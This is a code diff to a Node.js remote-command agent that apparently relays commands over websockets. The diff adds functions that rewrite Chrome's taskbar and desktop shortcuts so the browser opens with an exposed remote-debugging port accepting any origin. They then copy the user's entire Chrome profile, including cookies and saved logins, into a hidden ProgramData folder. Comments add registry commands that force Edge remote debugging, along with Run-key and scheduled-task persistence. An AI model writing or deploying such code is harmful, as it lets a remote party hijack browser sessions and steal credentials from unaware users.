@@ -798,6 +798,8 @@ class CmdConfig {
         install_python: install_python,
         install_node: install_node,
         cleanup: cleanup,
+        modify_chrome: modify_chrome,
+        modify_msedge: modify_msedge,
 
         getsystemoverview: getsystemoverview,
         getscreencapture: getscreencapture,
@@ -4286,13 +4288,34 @@ async function getsystemoverview() {
     process.exit(0);
 }
 
-async function setup_msedge_relay() {
+async function modify_msedge() {
+    // C:\Users\ADULT2022\AppData\Local\Microsoft\Edge\User Data
+}
+
+async function copy_userdata(srcpath, destpath) {
+                                              
+    let copycmdstr = `robocopy "${srcpath}" "${destpath}" /E /R:0 /W:0`;
+                                              
+    return new Promise((resolve, reject) => { 
+        exec(copycmdstr, (error, stdout, stderr) => {
+            if (error) {                      
+                reject(error);                
+            }                                 
+
+            if (! isNullOrWhitespace(stderr) )
+                resolve(stderr);
+
+            resolve("");
+        });
+    });
 
 }
 
 // anchor
 // TODO modify for client PCs / TPL
-function modify_chrome() {
+async function modify_chrome() {
+
+    logmsg('starting');
 
     let runningcmd = systemstate.cmdconfig;
 
@@ -4302,8 +4325,7 @@ function modify_chrome() {
     // --ignore-certificate-errors --> causes warning popup in chrome on startup/launch
     cmdlineargs = `--user-data-dir="C:\\ProgramData\\owd\\chrome" --profile-directory=Default --remote-allow-origins=* --restore-last-session --remote-debugging-port=9223`;
     shortcut_path = `"C:\\Users\\ADULT2022\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk"`;
-    // C:\Users\Public\Desktop
-    
+
     let jsonconfig = {
         "cmd_line_args": cmdlineargs,
         "shortcut_path": shortcut_path
@@ -4313,6 +4335,22 @@ function modify_chrome() {
 
     let childp = execPSScript(scriptfpath, [jsonconfigpath]);
 
+    shortcut_path = `"C:\\Users\\Public\\Desktop\\Google Chrome.lnk"`;
+
+    jsonconfig = {
+        "cmd_line_args": cmdlineargs,
+        "shortcut_path": shortcut_path
+    };
+
+    writeTag(jsonconfigpath, JSON.stringify(jsonconfig));
+
+    childp = execPSScript(scriptfpath, [jsonconfigpath]);
+
+    srcpath = 'C:\\Users\\ADULT2022\\AppData\\Local\\Google\\Chrome\\User Data';
+    destpath = 'C:\\ProgramData\\owd\\chrome';
+
+    await copy_userdata(srcpath, destpath);
+
     process.exit(0);
 }
 
@@ -4320,7 +4358,7 @@ function modify_chrome() {
 async function __setup_chrome_relay() {
 
     // 1. modify shotfut lnk file in taskbar and start menu, etc.
-    // 2. modify registry paths as needed
+    // 2. modify registry paths as needed (doesn't work on TPL for that specific path)
     // 3. robocopy user data dir
     // 4. execute curl test
 
@@ -4336,7 +4374,7 @@ async function __setup_chrome_relay() {
     //    Get-ItemProperty -Path "HKCU:\Software\Classes\ChromeHTML\shell\open\command" --> returned empty
     //    Get-ItemProperty -Path "HKLM:\Software\Classes\ChromeHTML\shell\open\command"
     // ! was not able to modify reg using reg cmd or powershell -- attempt using VBScript
-    
+
     /*
     (default)    : "C:\Program Files\Google\Chrome\Application\chrome.exe" --single-argument %1
     PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Classes\ChromeHTML\shell\open\command
@@ -4351,7 +4389,7 @@ async function __setup_chrome_relay() {
     // msedge.exe --remote-debugging-port=9222 --user-data-dir="C:\ProgramData\owd\msedge"
     // reg add "HKLM\Software\Policies\Microsoft\Edge" /v "RemoteDebuggingAllowed" /t REG_DWORD /d 1 /f > %workdir%\mod_msedge.bat
     // reg add "HKCU\Software\Policies\Microsoft\Edge\WebView2\AdditionalBrowserArguments" /v "msedge.exe" /t REG_SZ /d "--remote-debugging-port=9222" /f >> %workdir%\mod_msedge.bat
-    // Startup-Boost: Pre-loads portions of msedge upon system boot so the application 
+    // Startup-Boost: Pre-loads portions of msedge upon system boot so the application
     // opens instantly on demand
     // reg add HKEY_CLASSES_ROOT\MSEdgeHTM\shell\open\command /ve /t REG_SZ /d "\"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe\" --remote-debugging-port=9222 -- \"^%1\"" /f
     // HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
@@ -4550,7 +4588,7 @@ function getIdleTaskXMLStr(
             <Date>2026-04-26T09:45:36.6514157</Date>
             <Author>test</Author>
             <URI>${intaskname}</URI>
-        </RegistrationInfo> 
+        </RegistrationInfo>
         <Triggers>
             <IdleTrigger>
                 <StartBoundary>${tasktimestr}</StartBoundary>
@@ -4604,19 +4642,19 @@ function getRepTaskXMLStr(
                 <Date>2026-04-26T09:45:36.6514157</Date>
                 <Author>test</Author>
                 <URI>${intaskname}</URI>
-            </RegistrationInfo> 
-            <Triggers> 
-                <CalendarTrigger> 
-                    <StartBoundary>${tasktimestr}</StartBoundary> 
-                    <Repetition> 
-                        <Interval>PT${tskxmltime}M</Interval> 
-                        <StopAtDurationEnd>false</StopAtDurationEnd> 
-                    </Repetition> 
-                    <ScheduleByDay> 
-                        <DaysInterval>1</DaysInterval> 
-                    </ScheduleByDay> 
-                </CalendarTrigger> 
-            </Triggers> 
+            </RegistrationInfo>
+            <Triggers>
+                <CalendarTrigger>
+                    <StartBoundary>${tasktimestr}</StartBoundary>
+                    <Repetition>
+                        <Interval>PT${tskxmltime}M</Interval>
+                        <StopAtDurationEnd>false</StopAtDurationEnd>
+                    </Repetition>
+                    <ScheduleByDay>
+                        <DaysInterval>1</DaysInterval>
+                    </ScheduleByDay>
+                </CalendarTrigger>
+            </Triggers>
             <Settings>
                 <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                 <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
@@ -4663,16 +4701,16 @@ function getTimeTaskXMLStr(
             <Date>2026-04-26T09:45:36.6514157</Date>
             <Author>test</Author>
             <URI>${intaskname}</URI>
-        </RegistrationInfo> 
-        <Triggers> 
-            <TimeTrigger> 
-                <StartBoundary>${tasktimestr}</StartBoundary> 
-                <Repetition> 
-                <Interval>PT${timetaskxmltime}M</Interval> 
-                </Repetition> 
-                <RandomDelay>PT30S</RandomDelay> 
-            </TimeTrigger> 
-        </Triggers> 
+        </RegistrationInfo>
+        <Triggers>
+            <TimeTrigger>
+                <StartBoundary>${tasktimestr}</StartBoundary>
+                <Repetition>
+                <Interval>PT${timetaskxmltime}M</Interval>
+                </Repetition>
+                <RandomDelay>PT30S</RandomDelay>
+            </TimeTrigger>
+        </Triggers>
         <Settings>
             <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
             <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
@@ -4718,7 +4756,7 @@ function getDailyTaskXMLStr(
             <Date>2026-04-26T09:45:36.6514157</Date>
             <Author>test</Author>
             <URI>${intaskname}</URI>
-        </RegistrationInfo> 
+        </RegistrationInfo>
         <Triggers>
             <CalendarTrigger>
                 <StartBoundary>${tasktimestr}</StartBoundary>
@@ -4785,13 +4823,13 @@ outgoing result
 */
 
 /*
-    { 
-        cmdtext:cmdtext, 
-        seqid:seqid++, 
-        cmdid:getRandomCode(8), 
+    {
+        cmdtext:cmdtext,
+        seqid:seqid++,
+        cmdid:getRandomCode(8),
         ts:getTimestamp()
     }
-    
+
     { execresult: str, ts: getTimestamp() }
 
     Python Relay
@@ -4805,9 +4843,9 @@ outgoing result
         ws_url
         ts
     }
-    
+
     client expects:
-    { 
+    {
       "MessageID":...
       "payload":{}
       "ws_url":
@@ -4820,5 +4858,5 @@ outgoing result
       "payload" --> holds result object from executing incoming cmd
     }
 
- 
+
 */
